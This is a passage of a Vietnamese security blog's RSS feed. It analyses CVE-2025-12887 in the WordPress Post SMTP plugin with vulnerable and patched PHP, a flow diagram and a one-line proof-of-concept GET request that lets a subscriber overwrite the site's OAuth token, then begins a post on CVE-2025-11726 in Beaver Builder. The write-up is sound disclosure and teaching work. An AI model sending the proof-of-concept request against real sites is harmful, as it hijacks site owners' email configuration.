(diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;`admin_init`&amp;#39;, array( $this, &amp;#39;handle_gmail_oauth_redirect&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hook &lt;code&gt;admin_init&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&#xA;Đây là một hook trong WordPress được kích hoạt &lt;strong&gt;mỗi khi một người dùng đã đăng nhập truy cập vào khu vực quản trị (admin area)&lt;/strong&gt;. Nó chạy sớm trong quá trình khởi tạo trang quản trị, trước khi bất kỳ nội dung nào được hiển thị.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Đăng ký action&lt;/strong&gt;&lt;br&gt;&#xA;Plugin Post SMTP đã đăng ký hàm &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; với hook &lt;code&gt;admin_init&lt;/code&gt;:&#xA;Điều này có nghĩa là &lt;strong&gt;bất kỳ người dùng nào đã đăng nhập&lt;/strong&gt; (kể cả với quyền thấp như &lt;em&gt;subscriber&lt;/em&gt;) đều có thể kích hoạt hàm này khi truy cập vào trang quản trị.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v3.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logic của hàm &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; cho thấy cách plugin Post SMTP xử lý việc nhận &lt;strong&gt;OAuth token&lt;/strong&gt; từ Gmail. Tuy nhiên, có một số điểm yếu nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Chỉ cần người dùng đã đăng nhập và truy cập vào trang quản trị với tham số &lt;code&gt;action=gmail_oauth_redirect&lt;/code&gt; và &lt;code&gt;access_token&lt;/code&gt; trong URL, logic update sẽ được gọi.&lt;/li&gt;&#xA;&lt;li&gt;Không có bất kỳ &lt;strong&gt;kiểm tra quyền hạn (capability check)&lt;/strong&gt; nào để đảm bảo chỉ quản trị viên mới được phép thực hiện.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v3.6.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_gmail_oauth_redirect() {&#xA;    // Check if the required OAuth parameters are present in the URL.&#xA;    if ( isset( $_GET[&amp;#39;action&amp;#39;] ) &amp;amp;&amp;amp; $_GET[&amp;#39;action&amp;#39;] === &amp;#39;gmail_oauth_redirect&amp;#39; ) {&#xA;        &#xA;    // Capability check: Only allow administrators to update OAuth tokens&#xA;    if ( ! current_user_can( &amp;#39;manage_options&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // CSRF protection: Verify nonce (required by security report)&#xA;    if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || empty( $_GET[&amp;#39;_wpnonce&amp;#39;] ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Nonce is missing.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;    &#xA;    // Verify the nonce&#xA;    $nonce = sanitize_text_field( $_GET[&amp;#39;_wpnonce&amp;#39;] );&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;gmail_oauth_redirect&amp;#39; ) ) {&#xA;        wp_die( esc_html__( &amp;#39;Security check failed. Invalid nonce. Please try again.&amp;#39;, &amp;#39;post-smtp&amp;#39; ) );&#xA;    }&#xA;        &#xA;        // Sanitize and retrieve URL parameters&#xA;        $access_token  = isset( $_GET[&amp;#39;access_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;access_token&amp;#39;] ) : null;&#xA;        $refresh_token = isset( $_GET[&amp;#39;refresh_token&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;refresh_token&amp;#39;] ) : null;&#xA;        $expires_in    = isset( $_GET[&amp;#39;expires_in&amp;#39;] ) ? intval( $_GET[&amp;#39;expires_in&amp;#39;] ) : 0;&#xA;        $msg           = isset( $_GET[&amp;#39;msg&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;msg&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $user_email    = isset( $_GET[&amp;#39;user_email&amp;#39;] ) ? sanitize_email( $_GET[&amp;#39;user_email&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $auth_token_expires = time() &amp;#43; $expires_in;&#xA;&#xA;        if ( $access_token ) {&#xA;            $oauth_data = array(&#xA;                &amp;#39;access_token&amp;#39;      =&amp;gt; $access_token,&#xA;                &amp;#39;refresh_token&amp;#39;     =&amp;gt; $refresh_token,&#xA;                &amp;#39;auth_token_expires&amp;#39;=&amp;gt; $auth_token_expires,&#xA;                &amp;#39;vendor_name&amp;#39;       =&amp;gt; &amp;#39;google&amp;#39;,&#xA;                &amp;#39;user_email&amp;#39;        =&amp;gt; $user_email,&#xA;            );&#xA;            // Save the OAuth parameters to the WordPress options table.&#xA;            update_option( &amp;#39;postman_auth_token&amp;#39;, $oauth_data );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kiểm tra quyền hạn (Capability check):&#xA;Chỉ administrator (người có quyền &lt;code&gt;manage_options&lt;/code&gt;) mới được phép cập nhật &lt;strong&gt;OAuth token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Bảo vệ CSRF bằng nonce:&#xA;Thêm &lt;strong&gt;nonce verification&lt;/strong&gt; để đảm bảo request thực sự được tạo từ trang hợp lệ trong WordPress, ngăn chặn tấn công &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Access admin area: /wp-admin/&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;admin_init hook is triggered&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Post SMTP: handle_gmail_oauth_redirect() is executed&amp;#34;]&#xA;--&amp;gt; E{&amp;#34;Is GET[action] = gmail_oauth_redirect ?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits – No impact&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Read parameters from URL: access_token, refresh_token, expires_in, user_email&amp;#34;]&#xA;--&amp;gt; H{&amp;#34;Is access_token present ?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Build OAuth data array&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;postman_auth_token&amp;#39;, oauth_data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;OAuth token is overwritten by attacker-controlled data&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request bằng tài khoản &lt;strong&gt;Subcriber+&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/?action=gmail_oauth_redirect&amp;amp;access_token=access_token_payload&amp;amp;refresh_token=refresh_to_payload&amp;amp;expires_in=expires_in_payload&amp;amp;user_email=user_email@gmail.com HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subcriber&amp;#43; cookie&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-12887 xuất phát từ việc plugin Post SMTP liên kết trực tiếp hàm &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; vào hook &lt;code&gt;admin_init&lt;/code&gt; mà không thực hiện bất kỳ kiểm tra quyền hạn hoặc cơ chế xác thực bổ sung nào. Điều này cho phép bất kỳ người dùng đã đăng nhập, kể cả với quyền thấp như &lt;strong&gt;Subscriber/Contributor&lt;/strong&gt;, có thể gửi request tùy ý để ghi đè giá trị &lt;code&gt;postman_auth_token&lt;/code&gt; trong bảng &lt;code&gt;options&lt;/code&gt; của WordPress.&lt;/p&gt;&#xA;&lt;p&gt;Việc thiếu &lt;strong&gt;capability check&lt;/strong&gt; và &lt;strong&gt;nonce verification&lt;/strong&gt; đã tạo ra một điểm yếu nghiêm trọng trong quy trình xử lý OAuth, dẫn đến nguy cơ chiếm quyền kiểm soát cấu hình gửi email của website. Bản vá ở phiên bản 3.6.2 đã khắc phục vấn đề bằng cách giới hạn quyền thực thi cho administrator và bổ sung kiểm tra nonce để ngăn chặn các request giả mạo.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ gắn các hành động nhạy cảm (như cập nhật token) vào hook chung như &lt;code&gt;admin_init&lt;/code&gt; mà không kiểm tra quyền hạn người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;current_user_can()&lt;/code&gt; để đảm bảo chỉ các vai trò phù hợp mới có thể thực hiện hành vi nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;Bắt buộc triển khai &lt;strong&gt;nonce verification&lt;/strong&gt; cho các request thay đổi trạng thái nhằm phòng chống CSRF.&lt;/li&gt;&#xA;&lt;li&gt;Không nên tin tưởng dữ liệu đến từ &lt;code&gt;$_GET&lt;/code&gt; hoặc &lt;code&gt;$_POST&lt;/code&gt; mà thiếu cơ chế xác thực và phân quyền rõ ràng.&lt;/li&gt;&#xA;&lt;li&gt;Việc cập nhật token OAuth cần được coi là hành động cấp quản trị và phải được bảo vệ tương đương các thay đổi quan trọng khác trong hệ thống.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin &amp;lt;= 3.6.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11726 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-07-cve-2025-11726/</link>
      <pubDate>Sun, 07 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-07-cve-2025-11726/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Beaver Builder – WordPress Page Builder&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;Missing Authorization&lt;/strong&gt; (thiếu phân quyền) trong tất cả các phiên bản cho đến và bao gồm &lt;strong&gt;2.9.4&lt;/strong&gt;. Nguyên nhân là do &lt;strong&gt;capability checks&lt;/strong&gt; không đầy đủ trong các &lt;strong&gt;REST API endpoints&lt;/strong&gt; thuộc namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, nơi kiểm soát các &lt;strong&gt;Global Presets&lt;/strong&gt; trên toàn bộ website. Điều này cho phép các &lt;strong&gt;authenticated attackers&lt;/strong&gt; có quyền từ mức &lt;strong&gt;contributor&lt;/strong&gt; trở lên có thể &lt;strong&gt;add, modify hoặc delete&lt;/strong&gt; các &lt;strong&gt;global color presets&lt;/strong&gt; và &lt;strong&gt;background presets&lt;/strong&gt;, từ đó ảnh hưởng đến toàn bộ nội dung sử dụng &lt;strong&gt;Beaver Builder&lt;/strong&gt; trên toàn site.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11726&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11726&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/beaver-builder-lite-version/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Beaver Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 